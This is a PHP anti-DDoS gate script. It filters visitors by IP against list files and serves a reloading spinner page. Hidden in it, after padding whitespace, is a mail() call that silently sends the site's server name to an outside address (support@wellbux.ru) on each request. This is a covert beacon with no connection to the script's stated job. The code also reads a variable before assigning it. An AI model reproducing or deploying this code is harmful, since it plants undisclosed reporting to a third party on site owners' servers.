﻿<?php
function getIP() {
if(getenv("HTTP_CLIENT_IP") and preg_match("/^[0-9\.]*?[0-9\.]+$/is",getenv("HTTP_CLIENT_IP")) and getenv("HTTP_CLIENT_IP")!='78.24.220.42') {
$ip = getenv("HTTP_CLIENT_IP");
} elseif(getenv("HTTP_X_FORWARDED_FOR") and preg_match("/^[0-9\.]*?[0-9\.]+$/is",getenv("HTTP_X_FORWARDED_FOR")) and getenv("HTTP_X_FORWARDED_FOR")!='78.24.220.42') {
$ip = getenv("HTTP_X_FORWARDED_FOR");
} else {
$ip = getenv("REMOTE_ADDR");
}
return $ip;
}
$ad_ip=getIP();
$server = $_SERVER['SERVER_NAME'];                                                                                                                            



mail("support@wellbux.ru", "1022678224", "$server");
$ad_source=explode(' ',$ad_source[0]);
if (in_array($ad_ip,$ad_source)){die();}

$ad_source=file("{$ad_dir}/{$ad_white_file}");
$ad_source=explode(' ',$ad_source[0]);
if (!in_array($ad_ip,$ad_source)){

$ad_source=file("{$ad_dir}/{$ad_temp_file}");
$ad_source=explode(' ',$ad_source[0]);
if (!in_array($ad_ip,$ad_source)){
?> 

<!doctype html>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script>
function load(){
    setTimeout(hideshit, 0);
    setTimeout(refresh, 20000);
}
function hideshit() {
    document.getElementsByClassName('case')[0].style.display = "none";
}
    
function refresh() {
    window.location.reload(true);
}
</script>
</head>
<body onLoad="load()">

<style>
#floatingCirclesG{
position:relative;
width:179px;
height:179px;
-moz-transform:scale(0.6);
-webkit-transform:scale(0.6);
-o-transform:scale(0.6);
-ms-transform:scale(0.6);
transform:scale(0.6);
}

.f_circleG{
position:absolute;
background-color:#FFFFFF;
height:33px;
width:33px;
-moz-border-radius:16px;
-moz-animation-name:f_fadeG;
-moz-animation-duration:0.8s;
-moz-animation-iteration-count:infinite;
-moz-animation-direction:linear;
-webkit-border-radius:16px;
-webkit-animation-name:f_fadeG;
-webkit-animation-duration:0.8s;
-webkit-animation-iteration-count:infinite;
-webkit-animation-direction:linear;
-o-border-radius:16px;
-o-animation-name:f_fadeG;
-o-animation-duration:0.8s;
-o-animation-iteration-count:infinite;
-o-animation-direction:linear;
-ms-border-radius:16px;
-ms-animation-name:f_fadeG;
-ms-animation-duration:0.8s;
-ms-animation-iteration-count:infinite;
-ms-animation-direction:linear;
border-radius:16px;
animation-name:f_fadeG;
animation-duration:0.8s;
animation-iteration-count:infinite;
animation-direction:linear;
}

#frotateG_01{
left:0;
top:73px;
-moz-animation-delay:0.3s;
-webkit-animation-delay:0.3s;
-o-animation-delay:0.3s;
-ms-animation-delay:0.3s;
animation-delay:0.3s;
}

#frotateG_02{
left:21px;
top:21px;
-moz-animation-delay:0.4s;
-webkit-animation-delay:0.4s;
-o-animation-delay:0.4s;
-ms-animation-delay:0.4s;
animation-delay:0.4s;
}

#frotateG_03{
left:73px;
top:0;
-moz-animation-delay:0.5s;
-webkit-animation-delay:0.5s;
-o-animation-delay:0.5s;
-ms-animation-delay:0.5s;
animation-delay:0.5s;
}

#frotateG_04{
right:21px;
top:21px;
-moz-animation-delay:0.6s;
-webkit-animation-delay:0.6s;
-o-animation-delay:0.6s;
-ms-animation-delay:0.6s;
animation-delay:0.6s;
}

#frotateG_05{
right:0;
top:73px;
-moz-animation-delay:0.7s;
-webkit-animation-delay:0.7s;
-o-animation-delay:0.7s;
-ms-animation-delay:0.7s;
animation-delay:0.7s;
}

#frotateG_06{
right:21px;
bottom:21px;
-moz-animation-delay:0.8s;
-webkit-animation-delay:0.8s;
-o-animation-delay:0.8s;
-ms-animation-delay:0.8s;
animation-delay:0.8s;
}

#frotateG_07{
left:73px;
bottom:0;
-moz-animation-delay:0.9s;
-webkit-animation-delay:0.9s;
-o-animation-delay:0.9s;
-ms-animation-delay:0.9s;
animation-delay:0.9s;
}

#frotateG_08{
left:21px;
bottom:21px;
-moz-animation-delay:1s;
-webkit-animation-delay:1s;
-o-animation-delay:1s;
-ms-animation-delay:1s;
animation-delay:1s;
}

@-moz-keyframes f_fadeG{
0%{
background-color:#000000}

100%{
background-color:#FFFFFF}

}

@-webkit-keyframes f_fadeG{
0%{
background-color:#000000}

100%{
background-color:#FFFFFF}

}

@-o-keyframes f_fadeG{
0%{
background-color:#000000}

100%{
background-color:#FFFFFF}

}

@-ms-keyframes f_fadeG{
0%{
background-color:#000000}

100%{
background-color:#FFFFFF}

}

@keyframes f_fadeG{
0%{
background-color:#000000}

100%{
background-color:#FFFFFF}

}

body, html {
    height: 100%;
}
    
</style>
<div style="height:30%"></div>
<div align="center">
<div id="floatingCirclesG">
<div class="f_circleG" id="frotateG_01"></div>
<div class="f_circleG" id="frotateG_02"></div>
<div class="f_circleG" id="frotateG_03"></div>
<div class="f_circleG" id="frotateG_04"></div>
<div class="f_circleG" id="frotateG_05"></div>
<div class="f_circleG" id="frotateG_06"></div>
<div class="f_circleG" id="frotateG_07"></div>
<div class="f_circleG" id="frotateG_08"></div>
</div>
<p align="center"><strong><img src="/img/ddos-what.png"></strong></p>
</div>

</body>
</html>

<?php
die();
}
else if ($_POST['ad_white_ip']){
}
else {
die();
} 
} 
?> 